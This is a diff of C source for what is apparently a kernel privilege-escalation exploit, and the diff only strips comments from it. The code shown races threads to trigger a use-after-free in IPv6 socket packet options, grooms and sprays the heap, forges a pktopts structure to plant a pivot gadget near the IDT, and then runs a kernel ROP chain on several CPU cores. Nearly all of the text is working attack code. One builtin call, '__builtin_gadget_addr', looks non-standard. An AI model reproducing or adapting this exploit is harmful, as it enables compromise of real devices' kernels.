@@ -87,13 +87,11 @@ void* use_thread(void* arg) {
     cmsg->cmsg_type = IPV6_TCLASS;
     *(int*)CMSG_DATA(cmsg) = 0;
 
-    /* Reduced polling frequency with exponential backoff */
     int poll_count = 0;
     while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
         if (set_pktopts(o->master_sock, buf, sizeof(buf)))
             *(volatile int*)0;
         
-        /* Added small delay every few iterations to reduce CPU usage */
         if (++poll_count % 100 == 0) {
             nanosleep(NANOSLEEP_100US, NULL);
         }
@@ -112,7 +110,6 @@ void* free_thread(void* arg) {
         if (free_pktopts(o->master_sock))
             *(volatile int*)0;
         
-        /* Reduce polling frequency - always sleep in this thread */
         nanosleep(NANOSLEEP_100US, NULL);
         poll_count++;
     }
@@ -128,16 +125,14 @@ void trigger_uaf(struct opaque* o) {
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
 
-    int i; /* Use local variable for loop counter */
+    int i;
     while (1) {
-        /* Batch set operations for better cache performance */
         for (i = 0; i < SPRAY_SIZE; i++)
             set_tclass(o->spray_sock[i], TCLASS_SPRAY);
 
         if (get_tclass(o->master_sock) == TCLASS_SPRAY)
             break;
 
-        /* Batch free operations */
         for (i = 0; i < SPRAY_SIZE; i++)
             if (free_pktopts(o->spray_sock[i]))
                 *(volatile int*)0;
@@ -161,20 +156,18 @@ int build_rthdr_msg(char* buf, int size) {
     return size;
 }
 
-/* Use spray to force reuse of freed memory (UAF) */
 int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
     free_pktopts(overlap_sock);
     char buf[0x100] = {0};
     int l = build_rthdr_msg(buf, 0x100);
     int tclass;
-    int i; /* Use local variable for loop counter */
+    int i;
 
-    /* Pre-calculate offsets outside the loop */
     unsigned long long* pktinfo_ptr = (unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET);
     unsigned int* tclass_ptr = (unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET);
 
     while (1) {
-        *pktinfo_ptr = pktinfo; /* Set once outside inner loop */
+        *pktinfo_ptr = pktinfo;
         
         for (i = 0; i < SPRAY_SIZE; i++) {
             *tclass_ptr = tclass0 | i;
@@ -251,14 +244,12 @@ void reset_ipv6_opts(int s) {
     static const int tclass = -1;
     static const struct in6_pktinfo z = {0};
     
-    /* Batch socket option operations for better performance */
     setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
     setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
     setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
 }
 
 void iterative_socket_cleanup(int sock) {
-    /* Pre-allocate structures to avoid repeated initialization */
     static const struct in6_pktinfo safe = {0};
     static const int tclass_reset = -1;
     int i;
@@ -266,7 +257,6 @@ void iterative_socket_cleanup(int sock) {
     for (i = 0; i < SOCKET_CLEANUP_RETRIES; i++) {
         set_pktinfo(sock, (char*)&safe);
         
-        /* Batch socket option resets */
         setsockopt(sock, IPPROTO_IPV6, IPV6_TCLASS, &tclass_reset, sizeof(tclass_reset));
         setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
         setsockopt(sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, NULL, 0);
@@ -277,7 +267,6 @@ void iterative_socket_cleanup(int sock) {
     }
 }
 
-/*  External inputs from gadgets and ROP buffers */
 void (*enter_krop)(void);
 extern uint64_t krop_idt_base;
 extern uint64_t krop_jmp_crash;
@@ -316,19 +305,16 @@ int main() {
     int master_sock = new_socket();
     krop_master_sock = master_sock * 8;
 	
-	/* Prepare pre heap grooming - optimized with batching */
 	{
 		int temp_sockets[HEAP_GROOM_COUNT];
 		int i;
-		/* Batch socket creation */
 		for(i = 0; i < HEAP_GROOM_COUNT; i++) {
 			temp_sockets[i] = new_socket();
 		}
-		/* Batch socket operations and cleanup */
 		for(i = 0; i < HEAP_GROOM_COUNT; i++) {
 			reset_ipv6_opts(temp_sockets[i]);  
 			close(temp_sockets[i]);  
-			if (i % 10 == 0) /* Reduce nanosleep frequency */
+			if (i % 10 == 0)
 				nanosleep(NANOSLEEP_75US, NULL);
 		}
 	}  
@@ -346,12 +332,10 @@ int main() {
         .spray_sock = spray_sock
     };
 
-    /* The kernel exploit is only executed after trigger_uaf() and fake_pktopts() validation */
     for (int attempts = 0; attempts < MAX_ATTEMPTS; attempts++) {
         int overlap_idx = -1;
         int i;
         
-        /* Batch close and recreate operations for better performance */
         for (i = 0; i < SPRAY_SIZE; i++) {
             close(spray_sock[i]);
         }
@@ -364,7 +348,6 @@ int main() {
         trigger_uaf(&o);
         set_tclass(master_sock, TCLASS_TAINT);
 
-        /* Early exit optimization - check multiple sockets in batches */
         for (i = 0; i < SPRAY_SIZE; i++) {
             if (get_tclass(spray_sock[i]) == TCLASS_TAINT) {
                 overlap_idx = i;
@@ -380,7 +363,6 @@ int main() {
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
 
-        /* Build fake pktopts */
         overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
         if (overlap_idx < 0)
             continue;
@@ -390,18 +372,15 @@ int main() {
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
 
-        /* Modify pktinfo with pivot - use stack allocation for small buffer */
         char buf[32];
         get_pktinfo(master_sock, buf);
 
         uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
 
-        /* Batch buffer modifications */
         *(uint16_t*)(buf + 4) = (uint16_t)entry_gadget;
         *(uint64_t*)(buf + 10) = entry_gadget >> 16;
         buf[9] = 0xee;
 
-        /* Batch krop assignments */
         krop_c3bak1 = *(uint64_t*)(buf + 4);
         krop_c3bak2 = *(uint64_t*)(buf + 12);
         krop_ud1 = *(uint64_t*)(buf + 4);
@@ -419,14 +398,13 @@ int main() {
 
         nanosleep(NANOSLEEP_100US_ALT, NULL);
         
-        break; /* Successful exploit run spray ROP chain */
+        break;
     }
 	
-    /* Map spray to ROP execution - optimized memory operations */
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
 
-    size_t spray_size = spray_stop - spray_start; /* Check spray_size */
+    size_t spray_size = spray_stop - spray_start;
     if (spray_size == 0 || spray_size > 0x10000)
         *(volatile int*)0;
 
@@ -440,16 +418,14 @@ int main() {
             spray_map[i] = spray_start[i];
     }
 
-    /* Run malloc sprays for pinned cores - optimized CPU pinning */
     pin_to_cpu(1);
-    rop_call_funcptr(spray_map, spray_sock, kernel_base); /* Core 1 for spray_sock overlap */
+    rop_call_funcptr(spray_map, spray_sock, kernel_base);
 
-    /* Batch remaining core operations */
     {
         int cpu;
         for (cpu = 2; cpu <= 7; cpu++) {
             pin_to_cpu(cpu);
-            rop_call_funcptr(spray_map, NULL, kernel_base); /* Remaining cores for malloc sprays */
+            rop_call_funcptr(spray_map, NULL, kernel_base);
         }
     }
 
